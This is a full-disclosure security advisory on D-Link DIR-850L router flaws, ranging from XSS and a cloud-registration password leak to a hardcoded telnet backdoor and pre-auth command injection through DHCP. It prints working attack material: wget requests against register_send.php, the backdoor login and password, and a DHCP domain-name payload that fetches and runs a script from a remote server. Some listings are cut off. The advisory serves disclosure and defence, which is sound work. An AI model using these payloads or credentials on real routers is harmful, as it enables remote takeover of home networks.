## Product Description

Dlink is a multinational networking equipment manufacturing corporation.

The Dlink 850L is a Wireless AC1200 Dual Band Gigabit "Cloud" Router.

Mydlink Cloud Services allow you to access, view and control the devices on your home network from anywhere.



## Vulnerabilities Summary

The Dlink 850L is a router overall badly designed with a lot of vulnerabilities.

Basically, everything was pwned, from the LAN to the WAN. Even the custom MyDlink cloud protocol was abused.

My research in analyzing the security of Dlink 850L routers starts from a recent security contest organized by a security company.
The Dlink 850L has 2 versions of these routers with very slight hardware modifications.
The contest targeted the first version (revisionA) but I (unfortunately) received the wrong version, revisionB (thank you Amazon!), which was not eligible for the contest.  
In this advisory, I would like to introduce the 0day vulnerabilities from both versions of Dlink 850L that were not submitted to the contest.
Note that I submitted a valid vulnerability to SSD which was patched [https://blogs.securiteam.com/index.php/archives/3364].


Following a very badly coordinated previous disclosure with Dlink last February
(see https://pierrekim.github.io/blog/2017-02-02-update-dlink-dwr-932b-lte-routers-vulnerabilities.html),
full-disclosure is applied this time.


The summary of the vulnerabilities is: 

1. Firmware "protection"
2. WAN && LAN - revA - XSS
3. WAN && LAN - revB - Retrieving admin password, gaining full access using the custom mydlink Cloud protocol
4. WAN        - revA and revB - Weak Cloud protocol
5. LAN        - revB - Backdoor access
6. WAN && LAN - revA and revB - Stunnel private keys
7. WAN && LAN - revA - Nonce bruteforcing for DNS configuration
8. Local      - revA and revB - Weak files permission and credentials stored in cleartext
9. WAN        - revB - Pre-Auth RCEs as root (L2)
10. LAN       - revA and revB - DoS against some daemons


revA targets the revision A of the router with the latest firmware available (`DIR850L_REVA_FW114WWb07_h2ab_beta1.bin`).
revB targets the revision B of the router with the latest firmware images available (`DIR850LB1_FW207WWb05.bin` and `DIR850L_REVB_FW207WWb05_h1ke_beta1.bin` from http://support.dlink.com/ProductInfo.aspx?m=DIR-850L, `DIR850LB1 FW208WWb02.bin` [from http://support.dlink.com.au/Download/download.aspx?product=DIR-850L]).



## Details - Firmware "protection"

The latest firmware for Dlink 850L revA (`DIR850L_REVA_FW114WWb07_h2ab_beta1.bin`) is not protected and a new firmware image can be trivially forged by an attacker.

The latest firmware images for Dlink 850L revB (`DIR850LB1_FW207WWb05.bin`, `DIR850L_REVB_FW207WWb05_h1ke_beta1.bin` and `DIR850LB1 FW208WWb02.bin`) are password-protected with a hardcoded password.

Here is a program to decrypt the firmware image:

## Details - WAN && LAN - revA - XSS

Simply by analyzing PHP files inside `/htdocs/web`, we can discover several trivial XSS.

An attacker can use the XSS to target an authenticated user in order to steal the authentication cookies.


/htdocs/web/wpsacts.php:

    user@kali:~/petage-dlink$ wget -qO- --post-data='action=<a>' http://ip:port/wpsacts.php
    <?xml version="1.0" encoding="utf-8"?>
    <wpsreport>
            <action><a></action>
            <result></result>
            <reason></reason>
    </wpsreport>


    user@kali:~/petage-dlink$ cat ./fs/htdocs/web/wpsacts.php
    [..]
    <wpsreport>

## Details - WAN && LAN - revB - Retrieving admin password, gaining full access using the custom mydlink Cloud protocol

DISCLAIMER: Beware, no request has been sent directly to any servers operated by Dlink or other companies. All internet network traffic shown below
is legitimate and produced by Dlink itself, or by products of Dlink (Dlink Cloud, Dlink browser extensions, Dlink 850L). All the findings exposed
below were discovered without exceeding Dlink terms of use. This simply demonstrates how much broken this service is at the time of writing (run
away!).

The webpage http://ip_of_router/register_send.php doesn't check the authentication of the user, thus an attacker can abuse this webpage to gain control of the device.
This webpage is used to register the device to the myDlink cloud infrastructure.

Attack scenario:

o The attacker will use the unauthenticated /register_send.php webpage to:
  1. create a MyDlink Cloud account,
  2. signin the device to this account,
  3. add the device to this account (the device will pass admin password to the Cloud platform! Meaning the passwords are stored in cleartext).

o The attacker will then visit Dlink mycloud webpage) using a classic browser (i.e.: Firefox 50) and install the official Dlink NPAPI extension (this will not work with Firefox > 50 or any recent version of Chrome since this plugin requires unsandboxed NPAPI support). This webpage will allow the attacker to remotely control the device (reboot, general management...).


o Then, using `Firefox dev tools`, the attacker can passively analyze the default HTTP requests/responses from the Dlink APIs on www.mydlink.com:
The dlink cloud interface will leak by default the password of the device (!) inside the answer of a `PUT` request (and inside `GET` requests too). Just
by watching the HTTP requests from the NPAPI plugin, the APIs will provide passwords of the device in cleartext.

o Finally, the NPAPI plugins will automatically establish a tunnel between the router and the Firefox browser:
the attacker will be able to visit `http://127.0.0.1:dynamicaly_generated_remote_port/` to reach the remote router.
The traffic will go directly to Amazon servers then to the remote Dlink router:

  Firefox NPAPI client (http://127.0.0.1:remote_port/)   ->    Amazon   ->    Dlink 850L HTTP Interface.


o The attacker will use the previous password provided by the legit HTTPS answers from the Dlink APIs and will be able to login inside the router.
At that point complete control over the router is achieved.

o This is made possible by the `signalc` program (inside /mydlink/) that creates a TCP tunnel to Amazon servers.

Finally, I will demonstrate some part of the traffic inside this tunnel is in cleartext and the other part (encrypted traffic) can be MITM'd
thanks to self-signed certificates and the complete lack of certificate verification.



Let's resume the attack:

The PHP script hosted at http://ip_of_router/register_send.php will serve as a proxy between the attacker and the remote Dlink APIs.
This page will also retrieve the password (it is stored in cleartext - see part 8. Weak files permission and credentials stored in cleartext) and send it to remote Dlink APIs.


    151 $devpasswd = query("/device/account/entry/password"); <- $devpasswd contains the password of the device
    152 $action = $_POST["act"];


The password will be sent during the association of the device (3rd request : "adddev") to the Mydlink Cloud service (see the `&device_password=$devpasswd`):

    178 //sign up
    179 $post_str_signup = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
    180                    "&action=sign-up&accept=accept&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"].
    181                    "&password_verify=" .$_POST["passwd"]. "&name_first=" .$_POST["firstname"]. "&name_last=" .$_POST["lastname"]." ";
    182 
    183 $post_url_signup = "/signin/";
    184 
    185 $action_signup = "signup";
    186 
    187 //sign in       
    188 $post_str_signin = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
    189             "&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"]." ";
    190 
    191 $post_url_signin = "/account/?signin";
    192 
    193 $action_signin = "signin";
    194 
    195 //add dev (bind device)
    196 $post_str_adddev = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
    197             "&dlife_no=" .$mydlink_num. "&device_password=" .$devpasswd. "&dfp=" .$dlinkfootprint." ";
    198 
    199 $post_url_adddev = "/account/?add";
    200 
    201 $action_adddev = "adddev";
    202 
    203 //main start
    204 if($action == $action_signup)                    <---- first request
    205 {
    206         $post_str = $post_str_signup;
    207         $post_url = $post_url_signup;
    208         $withcookie = "";   //signup dont need cookie info
    209 }
    210 else if($action == $action_signin)               <---- second request
    211 {
    212         $post_str = $post_str_signin;
    213         $post_url = $post_url_signin;
    214         $withcookie = "\r\nCookie: lang=en; mydlink=pr2c11jl60i21v9t5go2fvcve2;";
    215 }
    216 else if($action == $action_adddev)               <---- 3rd request
    217 {
    218         $post_str = $post_str_adddev;
    219         $post_url = $post_url_adddev;
    220 }



To exploit this vuln, let's create 3 HTTP requests to the dlink router:

The first one ("signup") will create an user on the MyDlink service:

    user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data 'act=signup&lang=en&outemail=MYEMAIL@GMAIL.COM&passwd=SUPER_PASSWORD&firstname=xxxxxxxx&lastname=xxxxxxxx' http://ip/register_send.php
    
    <?xml version="1.0"?>
    <register_send>
       <result>success</result>
       <url>http://mp-us-portal.auto.mydlink.com</url>
    </register_send>

Internally, this request was crafted and sent to MyDlink Cloud APIs:

    179 $post_str_signup = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
    180                    "&action=sign-up&accept=accept&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"].
    181                    "&password_verify=" .$_POST["passwd"]. "&name_first=" .$_POST["firstname"]. "&name_last=" .$_POST["lastname"]." ";


The second one ("signin") will "signin" the newly created user - the router will be associated with this account - but not activated:

    user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data 'act=signin&lang=en&outemail=MYEMAIL@GMAIL.COM&passwd=SUPER_PASSWORD&firstname=xxxxxxxx&lastname=xxxxxxxx' http://ip/register_send.php
    
    <?xml version="1.0"?>
    <register_send>
      <result>success</result>
      <url>http://mp-us-portal.auto.mydlink.com</url>
    </register_send>

Internally, this request was crafted and sent to MyDlink Cloud APIs:

    188 $post_str_signin = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
    189             "&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"]." ";


The last one will associate the device to the dlink service and will send the password of the device to the remote APIs of Dlink:

    user@kali:~/petage-dlink$ wget -qO- --user-agent="" --post-data 'act=adddev&lang=en' http://ip/register_send.php

    <?xml version="1.0"?>
    <register_send>
      <result>success</result>
      <url>http://mp-us-portal.auto.mydlink.com</url>
    </register_send>

Internally, this request was crafted and sent to MyDlink Cloud APIs:

    196 $post_str_adddev = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
    197             "&dlife_no=" .$mydlink_num. "&device_password=" .$devpasswd. "&dfp=" .$dlinkfootprint." ";


Now please confirm the email using the email sent from Dlink: 

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]


Then, visit http://mydlink.com/ and login using the email and the password.

You will see the device listed in the web interface (You need to install the plugin - you can use "IE8 - Win7.ova" from Microsoft, you need Firefox 50 to use the plugin).


Please see the attached screenshot to see the available management options:

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]

By analyzing the requests, we can get more information about the targeted router (note the requests are made by default when browsing the www.mydlink.com website!):

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]

It appears the `PUT` (`PUT IDENTIFIER_OF_THE_ROUTER`) request provides a response with the cleartext password of the device!

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]


Note that there is a `GET` request on the end of the image, we will study it too.

    https://eu.mydlink.com/device/devices/DEVICEID?_=SOME_RANDOM_DATA&access_token=ACCESS_TOKEN

The `POST` data are:

    {"id":"EDITED_DEVICE_ID","order":0,"mac":"EDITED_MAC_ADDRESS","model":"DIR-850L","ddnsServer":"eu.mydlink.com","activatedDate":"EDITED_ACTIVATION_DATE","hwVer":"B1","selected":true,"defaultIconUrl":"https://d3n8c69ydsbj5n.cloudfront.net/Product/Pictures/DIR-850L/DIR-850L_default.gif","type":"router","series":"","name":"","authKey":"","status":"","adminPassword":"","plainPassword":"","fwUpgrade":false,"fwVer":"","provVer":"","binded":true,"registered":null,"supportHttps":null,"signalAddr":"","features":[],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null},"added2UniPlugin":false,"connections":[{"id":"http","scheme":"http","tunnel":null,"ip":null,"port":null},{"id":"httpWithCredential","scheme":"http","tunnel":null,"ip":null,"port":null},{"id":"https","scheme":"https","tunnel":null,"ip":null,"port":null},{"id":"httpsWithCredential","scheme":"https","tunnel":null,"ip":null,"port":null},{"id":"liveview","scheme":"","tunnel":null,"ip":null,"port":null},{"id":"playback","scheme":"","tunnel":null,"ip":null,"port":null},{"id":"config","scheme":"","tunnel":null,"ip":null,"port":null}]}


The answer is, in cleartext (and contains the password of the device):

    {"name":"DIR-850L","status":"online","authKey":"EDITED","adminPassword":"password","plainPassword":"password","fwUpgrade":false,"fwVer":"2.07","provVer":"2.0.18-b04","binded":true,"registered":true,"supportHttps":true,"signalAddr":"mp-eu-signal.auto.mydlink.com","features":[1,2,3,4,28,29],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null}}


A `GET` request is done too (the last one on the previous image), which allows to retrieve the password and the previous one (was changed in the router to confirm this fact):

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]

The request is:

    GET https://eu.mydlink.com/device/devices/DEVICE_ID?_=RANDOM_NUMBER&access_token=ACCESS_TOKEN HTTP/1.1

And the answer is the same, with the previous password (plainPassword) and the new password (adminPassword):

    {"name":"DIR-850L","status":"online","authKey":"EDITED","adminPassword":"password","plainPassword":"PASSWORD","fwUpgrade":false,"fwVer":"2.07","provVer":"2.0.18-b04","binded":true,"registered":true,"supportHttps":true,"signalAddr":"mp-eu-signal.auto.mydlink.com","features":[1,2,3,4,28,29],"serviceCnvr":{"enabled":false,"plan":"","space":0,"expireTime":0,"contentValidThru":0},"serviceLnvr":{"targetStorageId":null,"targetStorageVolumeId":null}}



Finally, a request is made from the NPAPI plug-in asking for a tunnel between the browser and the remote router:

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]


The request to `/tssm/tssml.php` will ask the remote Cloud platform to forward the traffic to the device number 3XXXXXXX.
This will provide the attacker information about the new-established TCP tunnel from the browser NPAPI extension to the DLINK 850L router, via the Cloud platform:

    https://eu.mydlink.com/tssm/tssml.php?id=EDITED&no=EDITED_DEVICE_ID&type=1&state=3&status=1&ctype=4&browser=Mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0&message=[{"service":"http","scheme":"http","tunnel":"relay","ip":"127.0.0.1","port":50453},{"service":"https","scheme":"https","tunnel":"relay","ip":"127.0.0.1","port":50454}]&_=EDITED_RANDOM_VALUE

It appears the plugin listens on `127.0.0.1:50453/tcp` (HTTP) and `127.0.0.1:50454/tcp` (HTTP over SSL) as shown below:

Ok, let's browse `http://127.0.0.1:50453/`. The traffic is sent to the remote router over the Cloud protocol.

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]

By using the password leak found before (in the `PUT` and `GET` requests), the attacker can remotely pwn the router and update the firmware with a custom (backdoored) one:

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]

MISSION COMPLETE.

These vulnerabilities may affect some Dlink NAS/routers/cameras.

On a side note, it is interesting to find that DLink is storing all the passwords of devices using the mydlink service in cleartext.


 
## Details - WAN - revA and revB - Weak Cloud protocol

The MyDlink Cloud protocol is weak. No encryption is provided by default by this technology, it is only a basic TCP relay system.
All the traffic is sent over TCP to remote Amazon server without proper encryption:

[please use the HTML version at https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html to see the image]

There are 2 TCP relays:
- - - one with the HTTP server of the dlink router as an endpoint
- - - the other one with the HTTPS server of the dlink router as an endpoint.

So, it appears, the router is reachable over this TCP tunnel using either HTTP and HTTPS.
By default, you can see HTTP request AND HTTPS request from the browser (over the tunnel) to the router.
About the HTTPS requests, the SSL certificate provided by the router is self-signed. Sus, an invalid certificate can be forged and used in order to successful MITM the device and intercept information. More, by default, a TCP relay for HTTP is made by the NPAPI plugin to the router as shown above.


Futhermore, the `/mydlink/signalc` program running inside the router uses the MAC address of the device to get an unique identifier,
which will always be the same, even if the dlink device is reset or linked with a new dlink cloud account.
This allows Dlink to 'follow' the ownership of the device.

Hopefully, an user can change the MAC addresses of the device using the `rgbin` binary (`/usr/sbin/devdata` is a symlink to `/usr/sbin/rgbin` and the used argv[0] must be `devdata` to work):

    # /usr/sbin/devdata dump # will dump all the configuration
    # /usr/sbin/devdata set -e lanmac=00:11:22:33:44:55 # will define a new mac address for the lan interface

This program will only rewrite information over `/dev/mtdblock/4`.

Finally, the mydlink interface allows the user to enter credentials for gmail/hotmail accounts, the credentials are then transfered to the routers using the tunnel established with the cloud protocol.
It doesn't seem to be a good idea, as the traffic between the router and the Cloud platform is not encrypted or encrypted using a self-signed certificate without verification and the passwords are sent over this tunnel using the Internet.

These vulnerabilities may affect some Dlink NAS/routers/cameras (every device that supports the MyDlink cloud protocol).

Some wireshark (cleartext traffic and with self-signed certificate):

## Details - LAN - revB - Backdoor access

On revB, if you reset the device, the `/etc/init0.d/S80mfcd.sh` init script will start the `mfcd` binary with these arguments:

    mfcd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &

`mfcd` is in fact a telnetd server. the `-u` flag defines the authorized user with the associated password (`$image_sign` variable). 

`br0` is a bridge for these interfaces: `eth0`, `peth0`, `wlan0` et `wlan1`. This backdoor access can be only used from the LAN side.


    user@kali:~/petage-dlink$ cat fs/etc/init0.d/S80mfcd.sh
    #!/bin/sh
    echo [$0]: $1 ... > /dev/console
    orig_devconfsize=`xmldbc -g /runtime/device/devconfsize` 
    entn=`devdata get -e ALWAYS_TN`
    if [ "$1" = "start" ] && [ "$entn" = "1" ]; then
            mfcd -i br0 -t 99999999999999999999999999999 &
            exit
    fi
    
    if [ "$1" = "start" ] && [ "$orig_devconfsize" = "0" ]; then
            
            if [ -f "/usr/sbin/login" ]; then
                    image_sign=`cat /etc/config/image_sign`
                    mfcd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
            else
                    mfcd &
            fi 
    else
            killall mfcd
    fi


By using the login `Alphanetworks` and the password `wrgac25_dlink.2013gui_dir850l`, the attacker can get a root shell on the device:


    user@kali:~/petage-dlink$ telnet 192.168.0.1
    Trying 192.168.0.1...
    Connected to 192.168.0.1.
    Escape character is '^]'.
    Login: Alphanetworks
    Password: wrgac25_dlink.2013gui_dir850l
    
    
    BusyBox v1.14.1 (2017-01-20 14:35:27 CST) built-in shell (msh)
    Enter 'help' for a list of built-in commands.
    
    # echo what

## Details - WAN && LAN - revA and revB - Stunnel private keys

Keys are hardcoded inside the firmware. The administration can be used using HTTPS. This allows an attacker to do SSL MITM:

    # ls -la /etc/stunnel.key
    -rwxr-xr-x    1 root     root         1679 Jan 20  2017 /etc/stunnel.key

## Details - WAN && LAN - revA - Nonce bruteforcing for DNS configuration

The file `htdocs/parentalcontrols/bind.php` allows to change DNS configuration.
It doesn't check authentication of the admin user.

An attacker can bruteforce the nonce (`?nonce=integer`). There are no limitations of HTTP requests and no authentication method:


      8 $uptime_limit = query(INF_getinfpath($WAN1)."/open_dns/nonce_uptime") + 1800;
      9 if(query(INF_getinfpath($WAN1)."/open_dns/nonce")!=$_GET["nonce"] || $_GET["nonce"]=="")
     10 {
     11         $Response="BindError";
     12 }
     13 else if(query("/runtime/device/uptime") > $uptime_limit)
     14 {
     15         $Response="BindTimeout";
     16 }


The attacker can then define new DNS servers:

     21         set(INF_getinfpath($WAN1)."/open_dns/deviceid", $_GET["deviceid"]);
     22         set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns1", $_GET["dnsip1"]);
     23         set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns2", $_GET["dnsip2"]);


An attacker can use this vuln to forward traffic to server he/she controls (i.e.: custom Dlink Cloud servers, to take control over the dlink router).



## Details - Local - revA and revB - Weak files permission and credentials stored in cleartext

It appears some files have weak permissions:

1. /var/passwd

/var/passwd contains credentials in cleartext.

The permissions of /var/passwd are: -rw-rw-rw- (666)

    # ls -la /var/passwd
    -rw-rw-rw-    1 root     root           28 Jan  1 00:00 /var/passwd
    # cat /var/passwd
    "Admin" "password" "0"


2. /var/etc/hnapasswd

Note that an attacker can use /var/etc/hnapasswd to retrieve the password in cleartext too:

    # cat /var/etc/hnapasswd
    Admin:password

The permissions of /var/etc/hnapasswd are: -rw-rw-rw- (666)

    # ls -la /var/etc/hnapasswd
    -rw-rw-rw-    1 root     root           20 Jan  1 00:00 /var/etc/hnapasswd


3. /etc/shadow

/etc/shadow is a symlink to /var/etc/passwd. The file /var/etc/passwd is world-readable, as shown below:

## Details - WAN - revB - Pre-Auth RCEs as root (L2)

The DHCP client running on the router is vulnerable to several command injections as root.

Please use the dhcpd.conf file provided:

When doing a DHCP request at startup, the router connects from the WAN the remote HTTP server:

    rasp-pwn-dlink# tail -f /var/log/nginx/access.log
    10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dhcp-rce HTTP/1.1" 200 383 "-" "Wget"
    10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dlink-telnetd HTTP/1.1" 200 10520 "-" "Wget"
    10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dhcp-rce HTTP/1.1" 200 383 "-" "Wget"

And now we got a telnetd from the WAN:

    rasp-pwn-dlink# telnet 10.254.239.10 110
    Trying 10.254.239.10...

Analysis of the vulnerabilities


There are several WAN RCEs. The first problem is located here:

/etc/services/INET/inet_ipv4.php

     94         $udhcpc_helper  = "/var/servd/".$inf."-udhcpc.sh";

And you have command injections everywhere starting line 101.


     99     fwrite(w,$udhcpc_helper, 
    100                 '#!/bin/sh\n'.

    103                         ' INF='.$inf.
    104                         ' INET='.$inet.
    105                         ' MTU='.$mtu.
    106                         ' INTERFACE=$interface'.
    107                         ' IP=$ip'.
    108                         ' SUBNET=$subnet'.
    109                         ' BROADCAST=$broadcast'.
    110                         ' LEASE=$lease'.
    111                         ' "DOMAIN=$domain"'.
    112                         ' "ROUTER=$router"'.
    113                         ' "DNS='.$dns.'$dns"'.

    115                         ' "MSCLSSTROUT=$msclsstrout"'.
    116                         ' "SSTROUT=$sstrout"'.
    117                         ' "SCOPE=$scope"'.
    118                         ' "WINSTYPE=$winstype"'.
    119                         ' "WINS=$wins"'.
    120                         ' "SIXRDPFX=$sixrd_prefix"'.
    121                         ' "SIXRDPLEN=$sixrd_prefixlen"'.
    122                         ' "SIXRDMSKLEN=$sixrd_msklen"'.
    123                         ' "SIXRDBRIP=$sixrd_bripaddr"'.
    124                         ' "SDEST=$sdest"'.

    126                         ' "SROUTER=$srouter"\n'.
    127                 'exit 0\n'
    128                 );


As you can see, variables are not sanitized. One solution is also to inject commands using the `/var/servd/$VAR-udhcpc.sh` script with `$domain` (`option domain-name` in isc-dhcp).

The `WAN-1-udhcpc.sh` file will be generated and called by `udhcpc` (`udhcpc -i eth1 -H dlinkrouter -p /var/servd/WAN-1-udhcpc.pid -s /var/servd/WAN-1-udhcpc.sh`)

    # cat WAN-1-udhcpc.sh
    #!/bin/sh
    echo [$0]: $1 $interface $ip $subnet $router $lease $domain $scope $winstype $wins $sixrd_prefix $sixrd_prefixlen $sixrd_msklen $sixrd_bripaddr ... > /dev/console
    phpsh /etc/services/INET/inet4_dhcpc_helper.php ACTION=$1 INF=WAN-1 INET=INET-3 MTU=1500 INTERFACE=$interface IP=$ip SUBNET=$subnet BROADCAST=$broadcast LEASE=$lease "DOMAIN=$domain" "ROUTER=$router" "DNS=$dns" "CLSSTROUT=$clsstrout" "MSCLSSTROUT=$msclsstrout" "SSTROUT=$sstrout" "SCOPE=$scope" "WINSTYPE=$winstype" "WINS=$wins" "SIXRDPFX=$sixrd_prefix" "SIXRDPLEN=$sixrd_prefixlen" "SIXRDMSKLEN=$sixrd_msklen" "SIXRDBRIP=$sixrd_bripaddr" "SDEST=$sdest" "SSUBNET=$ssubnet" "SROUTER=$srouter"
    exit 0


So using this DNS configuration will work against the router:

    option domain-name "`wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re;`";

In the logs, we confirm the execution:

    rasp-pwn-dlink# tail -f /var/log/nginx/access.log
    10.254.239.10 - - [03/Jul/2017:15:42:31 +0000] "GET /dhcp-rce HTTP/1.1" 200 383 "-" "Wget"
    10.254.239.10 - - [03/Jul/2017:15:42:31 +0000] "GET /dlink-telnetd HTTP/1.1" 200 10520 "-" "Wget"



Note that you also have command injections inside some generated files (in `/var/servd/`) using the `;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh /var/re;` payload:


    # cat /var/servd/DHCPS4.LAN-1_start.sh

    exit 0
    exit 0
    #

    xmldbc -s /runtime/inf:2/dhcps4/pool/start 192.168.7.100
    xmldbc -s /runtime/inf:2/dhcps4/pool/end 192.168.7.199

    udhcpd /var/servd/LAN-2-udhcpd.conf &
    exit 0
    exit 0
    # 



Bonus point: this attack will be relayed to internal clients using the dhcp server running inside the router.
So if you connect a vulnerable Dlink router to the internal network, it will be pwned too:

    # ps -w|grep dhcpd
     6543 root       984 S    udhcpd /var/servd/LAN-1-udhcpd.conf 
     6595 root       984 S    udhcpd /var/servd/LAN-2-udhcpd.conf 


The `/runtime/inf:{1,2}/dhcps4/pool/domain` entries in the `/var/servd/LAN-{1,2}-udhcpd.conf` files contain the rogue domain value:

    # cat /var/servd/LAN-1-udhcpd.conf
    remaining no
    start 192.168.0.100
    end 192.168.0.199

## Details - LAN - revA and revB - DoS against some daemons

It appears some daemons running in the routers (revA and revB) can be crashed remotely from the LAN.
As it doesn't provide further remote privileges to an attacker, this is only for information and was not detailed.



## Vendor Response

Due to difficulties in previous exchange with Dlink[1], Full-disclosure is applied.
Their previous lack of consideration about security made me publish this research without coordinated disclosure.

I advise to IMMEDIATELY DISCONNECT vulnerable routers from the Internet.
